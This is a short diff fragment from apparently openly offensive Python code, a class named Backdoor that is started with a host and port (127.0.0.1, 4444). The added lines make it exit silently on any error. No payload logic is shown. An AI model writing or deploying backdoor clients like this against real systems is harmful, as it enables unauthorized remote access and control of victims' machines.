@@ -75,3 +75,5 @@ class Backdoor:
 try:
     backdoor = Backdoor("127.0.0.1", 4444) 
     backdoor.run()
+except Exception:
+    sys.exit()
